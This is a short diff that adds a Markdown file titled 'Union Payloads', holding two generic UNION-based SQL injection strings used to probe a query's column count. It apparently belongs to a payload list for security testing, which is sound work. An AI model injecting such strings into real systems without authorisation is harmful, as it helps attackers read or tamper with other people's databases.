@@ -1,0 +1,3 @@
+# Union Payloads
+
+UNION SELECT 1,2,3,4-- , UNION ALL SELECT NULL,NULL,NULL--
